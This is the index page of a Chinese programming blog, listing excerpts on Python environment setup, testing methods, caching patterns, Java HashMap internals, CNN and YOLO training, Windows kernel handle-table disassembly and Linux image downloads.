<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cc96f30aa043acb22385d5d7659788e/" rel="bookmark">
			Anaconda详细安装教程以及Pycharm配置Anaconda环境（图文）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.Anaconda安装教程
2.Pycharm配置Anaconda环境
Anaconda安装教程 首先进入Anaconda官网Anaconda | The World’s Most Popular Data Science Platform
点击Download下载，此处会自动弹出下载安装包
如果遇到网页打不开，下载速度慢，可以使用清华源下载，链接：Index of /
笔者下载的是目前最新的安装包，注意下载的版本和系统版本，此处以为Windows64位系统为例 下载后得到一个安装包，运行该安装包，点击next下一步
然后点击I agree
选择Just Me 点击Next
选择你的安装地点，最好不要选择C盘，选择好后点击Next，选择的文件夹需要是一个空文件夹，所以建议在安装目录下手动创建一个文件夹
在如下页面建议勾选将anaconda添加到系统环境变量，这样可以在命令指示符（CMD）中直接使用conda命令，减少后续麻烦
点击Install后开始安装，等待即可
点击next
next
最后finish完成安装
Pycharm配置Anaconda环境 此处开始使用Pycharm配置Anaconda环境，打开Pycharm，点击文件-设置
之后点击python解释器，添加解释器，添加本地解释器
点击conda环境，点击小文件夹，添加conda可执行文件
找到安装Anaconda的文件夹下的conda.exe文件，选择后，点击确定
之后点击加载环境
点击使用现有环境，选择你安装的Anaconda的文件夹
之后点击确认，就配置好了
可以发现，系统在配置解释器，等系统配置好了就能用了
之后可以在右下角切换解释器，如果你觉得默认名字看着别扭，那就咱们一起换一个，点击解释器设置
之后如图，点击全部显示
右键你要改名的解释器 点击重命名就可以改名了，
起一个你喜欢的名字
之后一路确定，就大功告成啦
祝大家一切顺利！！！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2204bf42c89d57d31019b9a85f66f578/" rel="bookmark">
			软件测试基础知识整理（七）- 因果图法、正交法、场景法、错误推测法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、因果图法
1.1 因果图中的基本符号
1.2 操作步骤
二、正交法
2.1 正交表概念
2.2 举例说明
三、场景法
3.1 操作步骤
3.2 举例说明
四、错误推测法（了解）
一、因果图法 因果图法用于识别系统中可能存在的输入和输出的关系，可以帮助测试人员清理系统中的因果关系，以确定需要测试的不同情况和可能的结果。
用图解的方法表示输入和各种关系组测，写出判定表，从而设计测试用例。
因果图法作为判定表的辅助。
“因” —— 输入条件“果” —— 输出结果 1.1 因果图中的基本符号 通常在因果图中 Ci 表示原因，Ei表示结果
图片来源于网路 图片来源于网络 对于基本符号的解析该篇纹章讲的更加简单易懂：软件测试用例设计方法-因果图法
1.2 操作步骤 明确需求画因果图根据因果图设计判定表根据判定表设计测试用例 二、正交法 正交排列法用于生成一组有效且相对较小的测试用例，以覆盖多个输入参数的不同取值组合。简单来说就是能够使用最小的测试过程集合获得最大的测试覆盖率。
适用范围：当可能的输入数据或者输入数据的组合很大2，由于不可能为每个输入组合都创建测试用例，可以采用这种方法。
2.1 正交表概念 一种特制的表，一般的正交表标记为：$L_n(m^k)$
n 表示正交表的行数，也就是测试用例的数量，也就是需要测试组合的次数。（n 的取值可看作是参数中最大的水平数 m 的平方）k表示列数，即表示参数的个数或者总的独立变量数m是列的取值个数，即表示每个参数的水平数，即每个参数的可能取值数量。 如：$L_9(3^4)$
9行4列，每列有3个种取值个数叫4因素3水平 2.2 举例说明 假设我们要测试一款咖啡机的功能，有以下参数和水平数：
参数1：咖啡种类（浓缩咖啡、美式咖啡、拿铁咖啡），共3个水平数。
参数2：咖啡浓度（弱、中、浓），共3个水平数。
参数3：添加物（糖、牛奶），共2个水平数。
列举参数表：
参数表 咖啡种类咖啡浓度添加物浓缩咖啡弱糖美式咖啡中牛奶拿铁咖啡浓 列举正交表： 正交表 编号咖啡种类咖啡浓度添加物1浓缩咖啡弱糖2浓缩咖啡中牛奶3浓缩咖啡浓糖4美式咖啡弱牛奶5美式咖啡中糖6美式咖啡浓牛奶7拿铁咖啡弱糖8拿铁咖啡中牛奶9拿铁咖啡浓糖 依据正交表编写测试用例（多少正交表编号便列举多少测试用例，此处省略先列举2个）：
测试用例 用例编号测试模块用例标题重要级别前置条件输入数据执行步骤预期结果COF-01咖啡机咖啡机的功能按钮测试高启动咖啡机浓缩咖啡；弱；糖 1.点击咖啡种类按钮选择浓缩咖啡；
2.点击咖啡强度按钮选择弱；
3.点击添加物按钮选择糖；
咖啡机产出一杯浓度弱且加糖的浓缩咖啡COF-02咖啡机咖啡机的功能按钮测试高启动咖啡机浓缩咖啡；中；牛奶 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2204bf42c89d57d31019b9a85f66f578/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8caa61b8011f10e031553f5bd3dca6a4/" rel="bookmark">
			如果不知道这4种缓存模式，敢说懂缓存吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 在系统架构中，缓存可谓提供系统性能的最简单方法之一，稍微有点开发经验的同学必然会与缓存打过交道，最起码也实践过。
如果使用得当，缓存可以减少响应时间、减少数据库负载以及节省成本。但如果缓存使用不当，则可能出现一些莫名其妙的问题。
在不同的场景下，所使用的缓存策略也是有变化的。如果在你的印象和经验中，缓存还只是简单的查询、更新操作，那么这篇文章真的值得你学习一下。
在这里，为大家系统地讲解4种缓存模式以及它们的使用场景、流程以及优缺点。
缓存策略的选择 本质上来讲，缓存策略取决于数据和数据访问模式。换句话说，数据是如何写和读的。
例如:
系统是写多读少的吗？（例如，基于时间的日志）数据是否是只写入一次并被读取多次？（例如，用户配置文件）返回的数据总是唯一的吗？（例如，搜索查询） 选择正确的缓存策略才是提高性能的关键。
常用的缓存策略有以下五种：
Cache-Aside Pattern：旁路缓存模式Read Through Cache Pattern：读穿透模式Write Through Cache Pattern：写穿透模式 Write Behind Pattern：又叫Write Back，异步缓存写入模式 上述缓存策略的划分是基于对数据的读写流程来区分的，有的缓存策略下是应用程序仅和缓存交互，有的缓存策略下应用程序同时与缓存和数据库进行交互。因为这个是策略划分比较重要的一个维度，所以在后续流程学习时大家需要特别留意一下。
Cache Aside Cache Aside是最常见的缓存模式，应用程序可直接与缓存和数据库对话。Cache Aside可用来读操作和写操作。
读操作的流程图：
读操作的流程：
应用程序接收到数据查询（读）请求；
应用程序所需查询的数据是否在缓存上：
如果存在（Cache hit），从缓存上查询出数据，直接返回；如果不存在（Cache miss），则从数据库中检索数据，并存入缓存中，返回结果数据； 这里我们需要留意一个操作的边界，也就是数据库和缓存的操作均由应用程序直接进行操作。
写操作的流程图：
这里的写操作，包括创建、更新和删除。在写操作的时候，Cache Aside模式是先更新数据库（增、删、改），然后直接删除缓存。
Cache Aside模式可以说适用于大多数的场景，通常为了应对不同类型的数据，还可以有两种策略来加载缓存：
使用时加载缓存：当需要使用缓存数据时，从数据库中查询出来，第一次查询之后，后续请求从缓存中获得数据；预加载缓存：在项目启动时或启动后通过程序预加载缓存信息，比如”国家信息、货币信息、用户信息，新闻信息“等不是经常变更的数据。 Cache Aside适用于读多写少的场景，比如用户信息、新闻报道等，一旦写入缓存，几乎不会进行修改。该模式的缺点是可能会出现缓存和数据库双写不一致的情况。
Cache Aside也是一个标准的模式，像Facebook便是采用的这种模式。
Read Through Read-Through和Cache-Aside很相似，不同点在于程序不需要关注从哪里读取数据（缓存还是数据库），它只需要从缓存中读数据。而缓存中的数据从哪里来是由缓存决定的。
Cache Aside是由调用方负责把数据加载入缓存，而Read Through则用缓存服务自己来加载，从而对应用方是透明的。Read-Through的优势是让程序代码变得更简洁。
这里就涉及到我们上面所说的应用程序操作边界问题了，直接来看流程图：
在上述流程图中，重点关注一下虚线框内的操作，这部分操作不再由应用程序来处理，而是由缓存自己来处理。也就是说，当应用从缓存中查询某条数据时，如果数据不存在则由缓存来完成数据的加载，最后再由缓存返回数据结果给应用程序。
Write Through 在Cache Aside中，应用程序需要维护两个数据存储：一个缓存，一个数据库。这对于应用程序来说，有一些繁琐。
Write-Through模式下，所有的写操作都经过缓存，每次向缓存中写数据时，缓存会把数据持久化到对应的数据库中去，且这两个操作在一个事务中完成。因此，只有两次都写成功了才是最终写成功了。坏处是有写延迟，好处是保证了数据的一致性。
可以理解为，应用程序认为后端就是一个单一的存储，而存储自身维护自己的Cache。
因为程序只和缓存交互，编码会变得更加简单和整洁，当需要在多处复用相同逻辑时这点就变得格外明显。
当使用Write-Through时，一般都配合使用Read-Through来使用。Write-Through的潜在使用场景是银行系统。
Write-Through适用情况有：
需要频繁读取相同数据不能忍受数据丢失（相对Write-Behind而言）和数据不一致 在使用Write-Through时要特别注意的是缓存的有效性管理，否则会导致大量的缓存占用内存资源。甚至有效的缓存数据被无效的缓存数据给清除掉。
Write-Behind Write-Behind和Write-Through在”程序只和缓存交互且只能通过缓存写数据“这方面很相似。不同点在于Write-Through会把数据立即写入数据库中，而Write-Behind会在一段时间之后（或是被其他方式触发）把数据一起写入数据库，这个异步写操作是Write-Behind的最大特点。
数据库写操作可以用不同的方式完成，其中一个方式就是收集所有的写操作并在某一时间点（比如数据库负载低的时候）批量写入。另一种方式就是合并几个写操作成为一个小批次操作，接着缓存收集写操作一起批量写入。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8caa61b8011f10e031553f5bd3dca6a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c1e1e2b42593e2512636342b3c4eced/" rel="bookmark">
			114. 二叉树展开为链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		114. 二叉树展开为链表 描述 给你二叉树的根结点 root ，请你将它展开为一个单链表：
展开后的单链表应该同样使用 TreeNode ，其中 right 子指针指向链表中下一个结点，而左子指针始终为 null 。展开后的单链表应该与二叉树 先序遍历 顺序相同。 示例：
给定二叉树 [3,9,20,null,null,15,7]
示例 示例1
输入：root = [1,2,5,3,4,null,6]
输出：[1,null,2,null,3,null,4,null,5,null,6]
示例2
输入：root = []
输出：[]
示例3
输入：root = [0]
输出：[0]
链接 https://leetcode.cn/problems/flatten-binary-tree-to-linked-list/
解题思路 思路一： 后序遍历 将root的左子树和右子树展开；将root的右子树接到左子树下方，然后将整个左子树作为右子树 实现代码如下：
/** * @param {TreeNode} root * @return {void} Do not return anything, modify root in-place instead. */ var flatten = function(root) { if (root == null) return root; flatten(root.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c1e1e2b42593e2512636342b3c4eced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fbc0b4df179568551e454159c3ae985/" rel="bookmark">
			实验12 卷积神经网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 实验目的 ①掌握深度学习的基本原理；
②能够使用TensorFlow实现卷积神经网络，完成图像识别任务。
2. 实验内容 ①设计卷积神经网络模型，实现对Mnist手写数字数据集的识别，并以可视化的形式输出模型训练的过程和结果；
②设计卷积神经网络模型，实现对Cifar10数据集的识别，并以可视化的形式输出模型训练的过程和结果。
3. 实验过程 题目一： 使用Keras构建和训练卷积神经网络，实现对Mnist手写数字数据集的识别，并测试模型性能，以恰当的形式展现训练过程和结果。
要求：
⑴编写代码，构建卷积神经网络，实现上述功能。
⑵调整超参数，记录实验过程和结果。
调整卷积神经网络的结构和训练参数，找出最佳的结构和超参数，记录和分析实验结果；
⑶保存最佳模型，计算各层参数个数和模型总参数；
⑷分析和总结：
你都调整了哪些参数？结合训练过程，说明各个超参数对模型性能的影响；
① 代码
import matplotlib.pyplot as plt import numpy as np import tensorflow as tf import pandas as pd #加载数据集 mnist = tf.keras.datasets.mnist (train_x,train_y),(test_x,test_y) = mnist.load_data() #对属性进行归一化，使它的取值在0-1之间，同时转换为tensor张量，类型为tf.flost32 X_train = train_x.reshape(60000,28,28,1) X_test = test_x.reshape(10000,28,28,1) X_train,X_test = tf.cast(X_train / 255.0,tf.float32),tf.cast(X_test / 255.0,tf.float32) y_train,y_test = tf.cast(train_y,tf.int32),tf.cast(test_y,tf.int32) #建立模型 model = tf.keras.Sequential([ #unit1 tf.keras.layers.Conv2D(16,kernel_size=(3,3),padding="same",activation=tf.nn.relu,input_shape=(28,28,1)), tf.keras.layers.MaxPool2D(pool_size=(2,2)), #unit2 tf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fbc0b4df179568551e454159c3ae985/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057378eedfaa26f7a5aaa38c502b7907/" rel="bookmark">
			Windows 10 X64 内核对象句柄表解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		fweWindows 很多API函数都会创建和使用句柄(传入参数)，句柄代表一个内核对象的内存地址，每个进程都有一个句柄表，它保存着进程拥有的句柄，内核也有一个句柄表 PspCidTable，它保存着整个系统的句柄。
ExpLookupHandleTableEntry windows内核句柄表结构解析
PAGE:00000001405F93D0 ExpLookupHandleTableEntry proc near ; CODE XREF: ObpReferenceObjectByHandleWithTag+EA↑p PAGE:00000001405F93D0 ; NtClose+B5↓p ... PAGE:00000001405F93D0 mov eax, [rcx] PAGE:00000001405F93D2 and rdx, 0FFFFFFFFFFFFFFFCh PAGE:00000001405F93D6 cmp rdx, rax ; 如果pid大于句柄表地址则认为是无效pid PAGE:00000001405F93D9 jnb short loc_1405F9435 PAGE:00000001405F93DB mov r8, [rcx+8] PAGE:00000001405F93DF mov eax, r8d PAGE:00000001405F93E2 and eax, 3 PAGE:00000001405F93E5 cmp eax, 1 ; 低两位表示句柄表层数level PAGE:00000001405F93E8 jnz short loc_1405F9402 ; 判断是否是2级句柄表 PAGE:00000001405F93EA mov rax, rdx ; rax=进程ID PAGE:00000001405F93ED shr rax, 0Ah ; 进程ID右移0xA PAGE:00000001405F93F1 and edx, 3FFh ; 进程ID &amp; 0x3ff PAGE:00000001405F93F7 mov rax, [r8+rax*8-1] PAGE:00000001405F93FC lea rax, [rax+rdx*4] PAGE:00000001405F9400 retn PAGE:00000001405F9400 ; --------------------------------------------------------------------------- PAGE:00000001405F9401 align 2 PAGE:00000001405F9402 PAGE:00000001405F9402 loc_1405F9402: ; CODE XREF: ExpLookupHandleTableEntry+18↑j PAGE:00000001405F9402 test eax, eax ; 1级句柄表处理 PAGE:00000001405F9404 jnz short loc_1405F940C PAGE:00000001405F9406 lea rax, [r8+rdx*4] ; 进程ID * 4 PAGE:00000001405F940A retn PAGE:00000001405F940A ; ---------------------------------------------------------------- 句柄表结构
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/057378eedfaa26f7a5aaa38c502b7907/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0db7dd1362538fe7f34e09e42a35b650/" rel="bookmark">
			密码学的简单实现：求椭圆曲线上的点 | 平方剩余的点 | ECC加密解密 的python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有代码注释以及运行时的过程注释，有助于理解，可自行删除
代码如下
from fractions import Fraction # 求x模y, 防止负数 def QiuMo(x, y): while x &lt; 0: x += y return x % y # 欧几里得算法 def Exgcd(a, b): if b == 0: return 1, 0, a else: x, y, q = Exgcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q # 求逆元，防止负数 def Inf(a, p): x, y, q = Exgcd(a, p) if q !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0db7dd1362538fe7f34e09e42a35b650/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8348d2de0f90e4c561a33ec83c67d3a/" rel="bookmark">
			【6】面试官必问：说一说 HashMap 中的容量与扩容如何实现？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		高手过招，招招致命 JDK1.8 中 HashMap 的底层实现，我相信大家都能说上来个 一二，底层数据结构 数组 + 链表（或红黑树） ，源码如下
/** * 数组 */ transient Node&lt;K,V&gt;[] table; /** * 链表结构 */ static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; { final int hash; final K key; V value; Node&lt;K,V&gt; next; Node(int hash, K key, V value, Node&lt;K,V&gt; next) { this.hash = hash; this.key = key; this.value = value; this.next = next; } public final K getKey() { return key; } public final V getValue() { return value; } public final String toString() { return key + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8348d2de0f90e4c561a33ec83c67d3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96e563b8a9080780f7883839e6742ae3/" rel="bookmark">
			【4】面试常问：你知道为什么HashMap是线程不安全的吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们都知道HashMap是线程不安全的，在多线程环境中不建议使用，但是其线程不安全主要体现在什么地方呢，本文将对该问题进行解密。
1.jdk1.7中的HashMap 在jdk1.8中对HashMap做了很多优化，这里先分析在jdk1.7中的问题，相信大家都知道在jdk1.7多线程环境下HashMap容易出现死循环，这里我们先用代码来模拟出现死循环的情况：
public class HashMapTest { public static void main(String[] args) { HashMapThread thread0 = new HashMapThread(); HashMapThread thread1 = new HashMapThread(); HashMapThread thread2 = new HashMapThread(); HashMapThread thread3 = new HashMapThread(); HashMapThread thread4 = new HashMapThread(); thread0.start(); thread1.start(); thread2.start(); thread3.start(); thread4.start(); } } class HashMapThread extends Thread { private static AtomicInteger ai = new AtomicInteger(); private static Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); @Override public void run() { while (ai.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96e563b8a9080780f7883839e6742ae3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed81d5e87d9d66348f4b30bc2a10362/" rel="bookmark">
			基于darknet框架&#43;yolov3训练自己的数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.准备标注工具
2.数据集准备
（1）下载数据集
（2）处理数据集
3.修改相应的配置文件
（1）修改voc.data和voc.names
（2）修改yolov3.cfg配置文件
4.下载权重文件
5.训练数据集
（1）训练开始
（2）训练结果
（3）测试结果
DarkNet的编译及安装的过程（无GPU的情况详解）
两款IP Camera+YOLOV3进行目标检测（手机摄像头作为电脑摄像头使用）
windows平台使用CMake工具对darknet的编译以及安装过程+yolov3+图像检测+摄像头检测+视频检测+手机作为摄像头进行检测（详解）
提示：
若读者还没有使用CMake工具对darknet源码进行编译，那么请看上面的文章《windows平台使用CMake工具对darknet的编译以及安装过程+yolov3+图像检测+摄像头检测+视频检测+手机作为摄像头进行检测（详解）》；
若已经在windows平台上对其darknet进行了编译，则可以直接进行下面的操作。
训练自己数据集的官方教程
以下整个过程结构图： 1.准备标注工具 （1）图像标注工具：pip install labelimg
（2）打开标注工具：labelimg（在windows的命令窗口激活相应的虚拟环境之后）
（3）选择要标注的图像文件夹；
2.数据集准备 （1）下载数据集 链接：https://pan.baidu.com/s/18R30A4NtFJ2vpLEIk8I1-w 提取码：b61k
提示：以上下载的数据集是已经处理好的，但是如果读者想要标注自己的数据集的话，那么建议在标注数据集的同时，文件的存放结构按照如下所示：
VOCdevkit VOC2007 Annotations（存放标注图像之后得到的XML文件）ImageSets（包含了存放图像的路径的.txt文件） ​​​​​​​Main ​​​​​​​train.txttest.txtval.txtJPEGImages（存放相应标注图像的位置.jpg）​​​​​​​​​​​​​​labels（运次那个处理数据集的程序之后产生的文件，里面包含了每一张图像对应的txt文件，.txt文件中包含了：[class,cx,cy,w,h]）2007_test.txt（包含了用于测试集的图像绝对路径）2007_train.txt（包含了用于训练集的图像绝对路径）2007_val.txt（包含了用验证集的图像绝对路径）train.all.txt（包含了所有图像绝对路径）train.txt（包含了用于训练集和验证集的图像绝对路径） 提示：为什么建议读者按照上方的结构来放置数据集呢，主要是因为在处理数据集的程序中给定的路径就如上方样式所示，而且上面这样的格式也比较清晰。
（2）处理数据集 提示：该代码看起来有一点长，但是读者不要害怕，关键的地方都做了说明，并且很容易理解。下面的一部分代码是原本就已经给出的，路径为：
import os import pickle import random import numpy as np from PIL import Image from os.path import join from os import listdir, getcwd import xml.etree.ElementTree as ET import cv2 # sets=[('2012', 'train'), ('2012', 'val'), ('2007', 'train'), ('2007', 'val'), ('2007', 'test')] # classes = ["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bed81d5e87d9d66348f4b30bc2a10362/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d010578a22541715ec35f1cfdd1c542/" rel="bookmark">
			通过Maven下载依赖Jar包流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 在浏览器中输入Maven仓库的官方地址：https://mvnrepository.com/
2. 在Maven仓库首页搜索框输入依赖Jar包的名称
3. 在Jar包多个版本中选择新的且使用较多的版本
4. 在页面复制Jar包Maven依赖，然后粘贴到pom中下载依赖Jar包
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5d264bcda392f017dec2c4eb7092cdf/" rel="bookmark">
			2023年25个Java8面试问题和答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java是一种非常流行的编程语言，从Android应用程序到物联网（IoT）无处不在。事实上，根据Codeplatoon的数据，Java在1年的招聘信息中排名#2022。考虑到它的普遍存在，对精通Java的专业人员的需求仍然很高也就不足为奇了。
这就是为什么我们要介绍在求职面试中发现的最常见的与Java 8相关的问题和答案。仅仅对给定主题（在这种情况下，例如Java）进行广泛的培训和理解是不够的。您需要组织您的想法，查看有关该主题的信息，并专注于最有可能被问到的问题。
我们将从Java 8的基础知识开始，然后逐步解决更棘手的问题。一旦你读完了这些材料，你将处于一个更好的位置来拥有那个关键的采访！
什么是Java 8？ 在我们解决这些问题之前，让我们在这里做一些基本的回顾，并确定Java 8是什么。Java 8 于 14 年 2014 月 &lt;&gt; 日发布，Java 将其描述为“......Java的最新版本，包含新功能，增强功能和错误修复，以提高开发和运行Java程序的效率。
Java 8 面试问题 - 基础级别 这里有一些Java8面试问题，让我们热身。
1. Java 8引入了哪些新功能？ 最新版本具有：
改进的、不可变的受 JodaTime 启发的日期和时间 API一种称为 Lambda 表达式的新语言，它将操作视为对象方法引用，允许通过使用方法名称直接引用方法来定义 Lambda 表达式默认方法，使用户能够在抽象方法之外的接口中添加完整的实现Nashorn，一个与JDK集成的基于Java的高性能引擎，用于评估和执行JavaScript代码Stream API，一个特殊的迭代器类，允许以函数方式处理对象集合 2. 为什么首先需要新版本的Java？ 主要有两个原因：
硬件的巨大变化使得Java需要更有效地使用当前的多核CPU。使用户能够使用新的函数式编程 （FP） 功能 3. 那么，Java 8带来了哪些实际优势？ 优点包括：
代码更简洁易读代码更可重用代码更易于测试和维护代码现在既高度并发又可扩展用户可以编写并行代码用户可以编写类似数据库的操作应用程序现在性能更好代码的生产力要高得多 4. 什么是 Lambda 表达式，为什么要使用它们？ 它是一个可以作为对象引用和共享的函数。Lambda 表达式需要较少的编码，提供了一种实现 Java 8 功能接口的方法，并允许用户封装一个行为单元以传递给其他代码。
5. 什么是功能接口？ 函数接口是仅包含一个抽象方法的接口。
6. 函数接口和 Lambda 表达式有何关系？ Lambda 表达式仅适用于函数接口的抽象方法。
7. 用户可以创建个人功能界面吗？ 是的，他们可以。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5d264bcda392f017dec2c4eb7092cdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dafbbb193154f9771b7d535dcd327c60/" rel="bookmark">
			S32K144调用空指令NOP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 之前在做STM32的时候，经常会用到NOP指令，意思是空指令NOP(No Operation)，无操作,是汇编语言的一个指令。
在S32K144中也有这样的指令，有时需要通过这个方法来进行时间或者操作的微调整，使用这个方法比较合适。
在s32_core_cm4.h文件中有明确定义：
/** \brief No-op */ #define NOP() __asm volatile ("nop") 使用的方法就是：
NOP(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6ec69aabc79a4749151bce09a331aee/" rel="bookmark">
			关于pycharm中OpenCV没有代码提示解决（一次就解决）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hello，小伙伴们，大家好。最近我也是在学习python的OpenCV库，最主要呢是完成学校布置的创新创业项目。我就最近根据我安装的OpenCV库和OpenCV没有代码提示，遇到的问题，将它们在这里分享给大家，希望对大家有帮助！
首先，我是用的pycharm，我们打开pycharm终端下载OpenCV库，我分享的链接下载都很快哦。
链接：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python
下载完之后，还要下载一个opencv-contrib-python的，据说是为了搭配OpenCV库更好的使用，这两个版本是要一致的，不然可能会出现问题。当然我这里下的都是最新版，按照我给的链接，它会自动下载最新版本的。
链接：pip install opencv-contrib-python -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com 下载好之后，我们的电脑就有了OpenCV库，我们可以看看是多少版本的
到了这里，说明我们前面的安装都非常成功。接下来就是解决没有代码提示的问题了。
在pycharm右上角点开设置 （类似小齿轮的）我这个是汉化过后的，小伙伴们可以自己去搜索一下pycharm汉化教程（最好不用，锻炼英语能力）
点开设置之后，找到project，点开python解释器小三角，点击全部显示。
点开之后，点击如图的路径图标。
出现下面这个弹窗，点击加号，添加cv2的路径。
找到你python安装的路径下的项目，找到site-packages下的cv2，然后一直点确定就行了
添加好之后是这样的
这样完成之后等pycharm更新完路径，用OpenCV就有代码提示啦。
这下面这个代码是我安装好OpenCV学人脸检测用到的，这里我也告诉大家，在我们下载好OpenCV库和opencv-contrib-python后，如果需要用到人脸检测，是可以不用去github官网下载人脸 检测的xml文件，它其实就在我们下载的cv2文件下的data文件夹里面，要用到人脸检测直接把路径放进去就好了。
import cv2 if __name__ == '__main__': img = cv2.imread('./zhoujielun.jpeg') img1 = cv2.resize(img, (400, 400)) # 人脸特征详细说明，一万多行，计算机根据这些特征进行人脸检测 face_detector = cv2.CascadeClassifier( "D:\python\pythonProject\\venv\Lib\site-packages\cv2\data\haarcascade_frontalface_alt2.xml") # 坐标x,y,h,w faces = face_detector.detectMultiScale(img1) for x, y, w, h in faces: # for循环进行数组遍历 cv2.rectangle(img1, pt1=(x, y), pt2=(x + w, y + h), color=[0, 0, 255], thickness=2) # pt1左上角坐标，pt2右下角坐标 cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6ec69aabc79a4749151bce09a331aee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc14048a4f1648f94870f31fb6e38642/" rel="bookmark">
			【CentOS】 CentOS 7 镜像下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新版本系统镜像下载(当前最新是CentOS 7.4版本)
CentOS官网 官网地址 http://isoredirect.centos.org/centos/7.4.1708/isos/x86_64/
进入下载页面
下载目录界面分为两个主要的资源区：
Actual Country，表示当前所在国家资源区；
Nearby Countries，表示附近国家资源区
每个资源下边又有本区的不同站点的资源，站点镜像信息中详细表示了镜像文件的地址、类型及版本号等信息。一般选择当前国家资源区的站点下载，获取资源速度比较快。
阿里云站点下载 http://mirrors.aliyun.com/centos/
进入国内的阿里云的，这里CentOS 7提供了三种ISO镜像文件的下载：DVD ISO、Everything ISO、Minimal ISO。
以下针对各个版本的ISO镜像文件，进行一一说明：
CentOS-7-x86_64-DVD-1708.iso 标准安装版，一般下载这个就可以了(推荐)
